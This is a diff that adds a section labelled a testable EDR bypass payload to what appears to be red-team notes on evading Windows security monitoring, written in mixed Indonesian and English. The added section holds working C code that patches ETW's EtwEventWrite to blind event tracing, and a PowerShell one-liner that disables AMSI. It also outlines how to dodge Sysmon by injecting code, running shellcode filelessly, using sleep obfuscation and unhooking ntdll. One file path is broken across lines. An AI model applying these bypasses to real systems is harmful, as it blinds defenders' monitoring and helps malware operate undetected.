@@ -82,3 +82,69 @@ Result: All common detection rule → bypassed
 - Sysmon — https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
 - EDR Evasion — https://www.outflank.nl/blog/2019/06/19/red-team-tactics-combatting-edr-solutions/
 - iRed.Team evasion — https://www.ired.team/offensive-security/defense-evasion
+
+## Konkret — EDR Bypass Payload (Testable)
+
+### Sysmon Evasion
+
+```bash
+# Sysmon config: Event ID 1 (ProcessCreate), 8 (RemoteThread), 11 (FileCreate)
+# Bypass:
+# 1. Process injection tanpa CreateRemoteThread:
+#    QueueUserAPC → tidak logged EID 8
+#    NtMapViewOfSection → shared memory inject → not EID 8
+# 2. Fileless: tidak ada EID 11 (no file drop)
+#    Shellcode langsung di memori → VirtualAlloc → Write → CreateThread
+# 3. LOLBin: parent = legitimate binary → EID 1 tidak suspicious
+#    Parent: explorer.exe → spawn: mshta.exe → payload
+```
+
+### ETW Patching
+
+```c
+// ETW (Event Tracing for Windows) → real-time event source
+// Bypass: patch ntdll!EtwEventWrite → return immediately
+//   (no event sent → EDR blind)
+
+// Patch code:
+// 1. Find ntdll!EtwEventWrite
+// 2. Write RET (0xC3) di first byte
+// 3. Now ETW events dropped → EDR blind
+
+// C code:
+FARPROC etw = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
+VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old);
+*(BYTE*)etw = 0xC3;  // ret
+VirtualProtect(etw, 1, old, &old);
+```
+
+### AMSI Bypass
+
+```powershell
+# AMSI (Anti-Malware Scan Interface) → scan script content sebelum exec
+# Bypass: patch amsi.dll!AmsiScanBuffer → return S_OK + no scan
+
+# Reflection-based bypass (no file, no detection):
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Hardware bypass (hardwareershell AMSI provider):
+# Modify content: split payload → bypass string match
+# Base64 encode → AMSI tidak decode (sometimes)
+```
+
+### Callback Memory Scan Evasion
+
+```c
+// 1. Sleep obfuscation: encrypt shellcode saat idle
+//    Saat thread sleep: VirtualProtect → PAGE_NOACCESS → encrypt
+//    Saat thread wake: decrypt → PAGE_EXECUTE_READ → run
+// 2. Randomize sleep time (jitter) → tidak match C2 beacon pattern
+// 3. Unhook ntdll (replace dengan clean copy dari disk)
+//    Map ntdll.dll dari C:\Windows\System32
+tdll.dll
+//    Overwrite .text section → remove EDR hooks
+```
+---
+
+audited
+---
